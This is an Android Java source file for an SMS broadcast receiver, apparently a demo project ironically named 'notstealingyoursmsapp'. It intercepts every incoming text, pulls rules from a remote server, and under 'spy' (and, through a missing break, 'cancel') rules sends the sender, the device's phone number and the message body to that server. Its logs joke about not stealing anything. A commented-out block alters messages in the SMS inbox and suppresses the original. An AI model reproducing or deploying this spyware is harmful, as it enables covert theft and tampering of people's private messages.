package com.example.vincent.notstealingyoursmsapp;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.example.vincent.notstealingyoursmsapp.api.ApiInterface;
import com.example.vincent.notstealingyoursmsapp.api.ServiceGenerator;
import com.example.vincent.notstealingyoursmsapp.api.model.MySms;
import com.example.vincent.notstealingyoursmsapp.api.model.Rule;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import okhttp3.OkHttpClient;
import okhttp3.logging.HttpLoggingInterceptor;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

/**
 * Created by Vincent on 06/02/2017.
 */

public class SmsBroadcastReceiver extends BroadcastReceiver {

    public static final String SMS_BUNDLE = "pdus";
    //private ArrayList<Rule> rules;
    private Context context;
    private Intent intent;
    private ApiInterface client;

    public void filter(List<Rule> rules) {
        
        TelephonyManager tMgr = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
        String mPhoneNumber = tMgr.getLine1Number();

        Bundle intentExtras = intent.getExtras();


        if (intentExtras != null) {
            Object[] sms = (Object[]) intentExtras.get(SMS_BUNDLE);
            String smsMessageStr = "";
            String address = "";
            String smsBody = "";


            for (int i = 0; i < sms.length; ++i) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) sms[i]);

                smsBody = smsMessage.getMessageBody();
                address = smsMessage.getOriginatingAddress();

                long timeMillis = smsMessage.getTimestampMillis();

                Date date = new Date(timeMillis);
                SimpleDateFormat format = new SimpleDateFormat("dd/MM/yy");
                String dateText = format.format(date);

                smsMessageStr += address + " at " + "\t" + dateText + "\n";
                smsMessageStr += smsBody + "\n";
            }



            Toast.makeText(context, smsMessageStr, Toast.LENGTH_SHORT).show();

            for (Rule rule:
                 rules) {
                if(rule.getPhoneNumberFrom().contains(address)||rule.getPhoneNumberTo().contains(mPhoneNumber)){
                    Log.d("RETROFIT Rule =",rule.getType());

                    switch (rule.getType()){
                        case "cancel" :
                            Log.d("RETROFIT","We didn't cancel anything, trust me");
                        case "spy":
                            Call<MySms> call = client.postSms(new MySms(address,mPhoneNumber,"",smsBody));
                            call.enqueue(new Callback<MySms>() {
                                @Override
                                public void onResponse(Call<MySms> call, Response<MySms> response) {
                                    if (response.isSuccessful()) {
                                        Log.d("RETROFIT","Everithing went right !! We obviously didn't stole anything ;)");
                                        //filter(response.body());
                                    } else {
                                        Log.e("RETROFIT","Error while posting sms");
                                    }
                                }

                                @Override
                                public void onFailure(Call<MySms> call, Throwable t) {
                                    // something went completely south (like no internet connection)
                                    Log.d("Error", t.getMessage());
                                }
                            });
                            break;
                        case "change":
                            break;
                    }
                }
            }

            /*if (smsMessageStr.contains("hello")) {
                Log.e("SMS", "ABORTED");
                ContentValues values = new ContentValues();
                values.put("address", address);
                values.put("body", smsBody + " absolutely not changed SMS");

                context.getContentResolver().insert(Uri.parse("content://sms/inbox"), values);
                abortBroadcast();
            }*/

            //this will update the UI with message
            ReceiveSmsActivity inst = ReceiveSmsActivity.instance();
            inst.updateList(smsMessageStr);
        }
    }
    public void onReceive(final Context context, Intent intent) {

        this.context = context;
        this.intent = intent;

        //ApiInterface client = ServiceGenerator.createService(ApiInterface.class);
        String API_BASE_URL = "http://10.0.2.2:3000/api/";

        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
        // set your desired log level
        logging.setLevel(HttpLoggingInterceptor.Level.BODY);

        OkHttpClient.Builder httpClient = new OkHttpClient.Builder();
        // add your other interceptors …

        // add logging as last interceptor
        httpClient.addInterceptor(logging);  // <-- this is the important line!

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(API_BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .client(httpClient.build())
                .build();

        this.client =  retrofit.create(ApiInterface.class);


        Call<List<Rule>> call = client.getAllRules();
        call.enqueue(new Callback<List<Rule>>() {
            @Override
            public void onResponse(Call<List<Rule>> call, Response<List<Rule>> response) {
                if (response.isSuccessful()) {
                    Log.d("Get all Rules", "onResponse: "+response);
                    filter(response.body());
                } else {
                    Log.e("RETROFIT","Error while getting all rules");
                }
            }

            @Override
            public void onFailure(Call<List<Rule>> call, Throwable t) {
                // something went completely south (like no internet connection)
                Log.d("Error", t.getMessage());
            }
        });
    }
}
